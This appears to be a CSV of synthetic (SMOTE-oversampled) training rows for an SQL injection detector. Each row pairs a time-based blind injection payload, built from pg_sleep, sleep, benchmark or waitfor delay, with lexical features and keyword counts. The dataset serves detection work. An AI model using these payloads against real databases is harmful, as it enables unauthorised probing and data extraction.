id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000220,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,2.154067632696851,33.0,16.494145031745127,3.4981399760638414,15.023419873019492,1.0,10.0,6.976580126980506,0.4552551476672574,0.030303030303030304,0.30303030303030304,0.2114115189994093,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,2.976580126980507,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.5058549682548733,0.0,0.0,0.0,0.0,0.4941450317451267,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000221,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.8079539800322515,99.69801788032686,31.514852034192327,3.7855190130441225,30.0,18.0,40.45544389742302,11.242573982903837,0.30117195953257475,0.18070317571954486,0.405384917843995,0.11273994690388539,0.7574260170961635,0.24257398290383642,2.0,0.0,0.0,2.0,0.0,5.242573982903837,0.0,1.0,0.0,4.0,0.7574260170961635,0.2425739829038365,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000222,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,0.2976686962599378,50.68620429922552,17.87448171969021,3.049702875746238,10.062759140154895,9.372408598451052,24.0,7.251036560619579,0.19878033808850995,0.18377271761668731,0.4737984214912989,0.14364852280350376,0.0,1.0627591401548946,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.2510365606195788,0.9372408598451053,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000223,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,1.0294544879560528,71.08195019859728,23.903971542055586,3.4747302588250824,17.370035572430517,15.807943084111177,29.451985771027793,8.451985771027793,0.24630581021375492,0.22052817384088103,0.41459868313140524,0.11856733281395879,1.0,0.0,0.0,0.0,0.0,1.7259928855138968,0.0,4.0,0.0,0.0,0.725992885513897,1.7259928855138968,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.725992885513897,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.725992885513897
SMOTE_000224,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,0.11268098255369831,103.24367824952115,30.0,3.886908640215895,26.0,29.95938695841314,36.24367824952115,11.040613041586859,0.25186286323260443,0.2902383993258144,0.3509687755159809,0.10692996192560023,1.0,0.0,2.0,0.0,0.0,2.0,0.0,5.040613041586859,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.9593869584131407,0.04061304158685919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000225,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,1.4789509763533557,82.57902512275335,20.579025122753347,3.0242945663661547,29.737075368260037,2.0,40.84194975449331,10.0,0.3600099143050587,0.024220092529311385,0.49466953051907303,0.12110046264655694,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.420974877246653,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5790251227533457,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.4209748772466543,0.5790251227533457,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000226,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.6633346077369002,49.81141932924888,19.751784270195138,3.4433444580187853,15.150356854039028,11.20285483231222,18.706423372702496,4.751784270195137,0.31445736464445107,0.22395794348097,0.3684866789332266,0.09309801294135228,0.0,0.0,0.0,0.0,0.0,1.1503568540390274,0.0,2.451070562117082,0.0,0.0,0.15035685403902746,1.1503568540390274,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.15035685403902738,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1503568540390274
SMOTE_000227,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,0.7105044594886991,79.67037704537411,23.670377045374114,3.375793900170296,17.0,19.0,34.0,9.670377045374115,0.21338664402351898,0.23849095508510945,0.426773288047038,0.12134911284433356,0.6703770453741149,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.6703770453741151,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000228,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.5862983411531668,35.13586699484276,12.649066854195858,2.4345801340829376,7.649066854195858,1.8377332864510354,20.0,5.649066854195858,0.21600947207945476,0.05323615333547325,0.571938780561797,0.15881559402327505,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.6490668541958582,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000229,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,1.570087719708103,65.45586867028726,20.0,3.133329952401282,23.272065664856374,1.363967167571814,30.819835837859067,10.0,0.3562663957867449,0.020642929699979037,0.47018596097992876,0.1529047135333473,3.3639671675718135,0.0,0.0,0.0,0.0,0.6360328324281866,0.0,5.363967167571813,0.0,0.6360328324281866,0.0,0.6360328324281865,1.0,0.0,0.0,0.0,0.0,0.6360328324281866,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.6360328324281866,0.0,0.0,0.0,1.0,0.36396716757181335,0.0,0.0,0.0,0.0,0.0,0.0,0.36396716757181335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3639671675718135
SMOTE_000230,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.24254043658687569,55.911227344115325,23.86684101617299,4.003815132151678,26.822454688230657,3.9556136720576633,15.133158983827007,10.0,0.47964759399795065,0.07072402654059784,0.27076339052003395,0.17886498894141756,2.1331589838270086,3.822454688230655,0.0,0.0,0.0,0.04438632794233621,0.0,1.9999999999999996,0.0,0.0,0.0,0.044386327942336434,1.0,0.9556136720576637,0.0,0.0,0.0,0.04438632794233621,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000231,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,0.5710889933794263,92.19412875180426,22.097064375902125,3.2593848530277665,35.514678120489364,1.0970643759021268,42.29119312770638,13.291193127706379,0.38533322756938815,0.011879717140517027,0.45867672989976965,0.1441103253903251,3.097064375902126,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.19412875180425287,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0970643759021264,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.097064375902127
SMOTE_000232,attack,time,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,nearest_attack_euclidean,R000092,0.529260136227788,131.35825183476695,24.817583537196327,2.9192763636967203,38.18241646280367,2.0,71.54066829757062,19.635167074392655,0.2909682160945758,0.015236690294110233,0.544370391683174,0.14942470192813995,4.0,0.0,0.0,0.0,1.0,1.0,0.0,13.635167074392655,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.1824164628036722,0.8175835371963277,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000233,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,0.7415260598642681,57.0800178696986,22.203641237190528,3.5956073838604663,18.610923711571584,10.0,21.46909415812702,7.0,0.32210035626891986,0.17659857867449455,0.3776820599844394,0.12361900507214618,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.2654529209364907,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.265452920936491
SMOTE_000234,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.9423693735492118,67.00524176362914,19.769633981817627,3.0480163339944824,22.15183009091187,1.769633981817626,33.005241763629144,10.078535927270506,0.33596943090917764,0.026031051428565294,0.4887664711687696,0.14923304649348743,3.769633981817626,0.0,0.0,0.0,0.0,0.7696339818176263,0.0,5.539267963635253,0.0,0.0,0.0,0.7696339818176263,1.0,0.0,0.0,0.0,0.0,0.7696339818176263,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.23036601818237373,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.230366018182374
SMOTE_000235,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",nearest_attack_euclidean,R000145,2.2321505927287064,101.95727990239489,24.0,3.2415378925287954,40.0,1.0,47.46439991866241,13.492879983732482,0.39266077959636403,0.009816519489909095,0.465213852461742,0.13230884845198482,1.4786399511974444,1.5213600488025558,0.0,0.0,1.0,0.0,0.0,9.492879983732482,0.0,0.0,0.0,1.0,0.4928799837324815,0.5071200162675186,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000236,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,1.5423781314663825,71.24692745982568,28.0,3.863174851193056,17.24692745982568,21.41564248660856,24.41564248660856,8.168715026782879,0.2417483528044201,0.30056937326932676,0.34269446478019233,0.11498780914606074,0.0,0.5843575133914395,0.0,0.0,0.0,1.0,0.0,4.0,0.5843575133914394,0.0,1.0,1.0,0.0,0.5843575133914394,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000237,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,0.9918329505971594,79.46013913537773,23.460139135377727,3.3641867019929372,17.0,19.0,34.0,9.460139135377727,0.2139521573890156,0.23912299943478216,0.4279043147780312,0.11902052839817101,0.4601391353777259,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.46013913537772594,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000238,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,1.3918912049385583,102.26944576864669,30.730554231353313,3.956447991506124,26.730554231353313,29.269445768646687,36.0,10.269445768646687,0.2613974391628191,0.2861859452799551,0.35201788999892625,0.10039872555829955,0.2694457686466871,0.7305542313533129,0.5388915372933744,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,2.5388915372933742,0.26944576864668723,0.7305542313533129,0.2694457686466872,0.7305542313533129,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000239,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",nearest_attack_euclidean,R000128,1.2634670060652275,125.81496286625048,23.530890770865472,2.8966646999877104,38.85190879471173,2.0,67.22229055365408,17.74076351788469,0.3072998694508131,0.016211317695797256,0.5357364156076874,0.1407523972457022,0.0,3.1605090119231276,0.0,0.0,1.0,0.0,0.0,13.370381758942347,0.0,0.0,0.0,1.0,0.0,0.7901272529807819,0.0,0.2098727470192181,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.7901272529807819,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.790127252980781
SMOTE_000240,attack,time,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",nearest_attack_euclidean,R000101,2.3622752711264146,92.09087706205281,22.990912293794718,3.039931498257058,16.963649175178872,14.036350824821126,48.09087706205281,13.0,0.19118971951955507,0.1494586318764711,0.5164991141475758,0.14285253445639806,1.9818245875894374,0.0,0.0,0.0,0.0,2.0,0.0,8.018175412410562,0.0,0.0,1.0,2.0,0.49545614689735923,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000241,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,1.783784504107691,90.11001387420572,22.166431544472655,3.156726707937364,29.88857539263021,2.0,43.33286308894531,14.888575392630209,0.3319302735115508,0.022311166522817616,0.481162035375213,0.1645965245904186,3.1664315444726565,0.0,0.0,0.0,1.0,0.7221438481575521,0.0,8.0,1.7221438481575522,0.0,0.0,1.7221438481575522,1.0,0.0,0.0,0.27785615184244794,0.0,0.7221438481575521,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.444287696315104,0.27785615184244794,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.722143848157552
SMOTE_000242,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.2200584290521549,99.46598460567954,30.133138458765583,3.7758784462738166,31.0,18.0,39.399415376296744,11.066569229382791,0.31175476245701683,0.18101889432988072,0.3959756739691134,0.11125066924398908,0.06656922938279086,0.9334307706172089,2.0,0.0,0.0,2.0,0.0,5.066569229382791,0.0,1.0,0.0,4.0,0.06656922938279097,0.933430770617209,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000243,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,0.20729982807307462,60.56521488457926,24.10434765897195,3.760320400994181,20.156521488457926,15.417390635887802,19.834781271775604,5.156521488457926,0.3347801314278104,0.2544558796893337,0.3257499547186735,0.08501403416418232,0.0,0.0,0.0,0.0,0.0,0.052173829485975376,0.0,4.1043476589719505,0.0,0.0,1.0,0.05217382948597549,0.0,0.0,0.0,0.0,0.0,0.05217382948597549,1.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.052173829485975376,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0521738294859753
SMOTE_000244,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.0029018892603609805,118.99885494513477,27.00229010973046,3.269339463693641,38.00458021946092,10.0,56.99198461594338,14.002290109730462,0.3193696452215303,0.08403442889536052,0.4789283177200243,0.11766760816308491,1.002290109730462,0.0,0.0,0.0,1.0,1.0,0.0,9.998854945134768,0.0,0.0,0.0,2.001145054865231,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.001145054865231,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.001145054865232
SMOTE_000245,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.086562269973286,90.16582323166544,26.979272096041818,3.4818977922547885,23.06218371187454,15.124367423749081,38.97927209604182,13.0,0.25575766436966024,0.1676537097122943,0.43238859213251835,0.14420003378552712,3.0207279039581802,0.0,0.0,0.0,0.0,1.0207279039581802,0.0,6.97927209604182,0.9792720960418199,0.0,1.0,1.02072790395818,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.9792720960418199,0.0,0.0,0.0,1.0,0.020727903958180194,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000246,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.13311795270979357,98.38479510623252,32.0,3.825728970268888,30.048099388279063,18.0,39.288596329674384,11.048099388279065,0.30546494867774093,0.1830067085182725,0.39923714200664434,0.11229120079734219,1.0,0.0,2.0,0.0,0.0,2.0,0.0,5.048099388279065,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.048099388279064126,0.9519006117209359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000247,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,0.17447343123470696,41.47917102856866,18.934896378571082,3.874058055363694,22.64193008214095,3.0651036214289187,7.837240946427702,7.934896378571082,0.5448169686747627,0.0753634056907588,0.18803182373755892,0.1917878018969196,4.902344567856622,0.0,0.06510362142891879,0.0,0.0,0.9674481892855407,0.0,0.0,0.0,0.0,0.0,1.0325518107144593,1.0,0.0,0.032551810714459395,0.0,0.0,0.9674481892855408,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.9674481892855407,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9674481892855407
SMOTE_000248,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,2.069964992756461,80.95523895516712,26.51119026120822,3.322188941180664,20.0,10.0,38.955238955167125,12.0,0.24720073522901595,0.12360036761450797,0.48087845601906654,0.14832044113740955,0.4888097387917808,0.5111902612082191,2.0,0.0,0.0,1.0,0.0,6.4888097387917805,0.5111902612082191,1.0,0.0,3.0,0.4888097387917809,0.5111902612082192,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000249,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.8012710869312671,55.90856715665365,20.0,3.13028940694244,13.0,10.531428242819512,25.314282428195117,7.062856485639024,0.23574345851333195,0.18991254520461473,0.44839647657948906,0.12594751970256426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.062856485639024,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
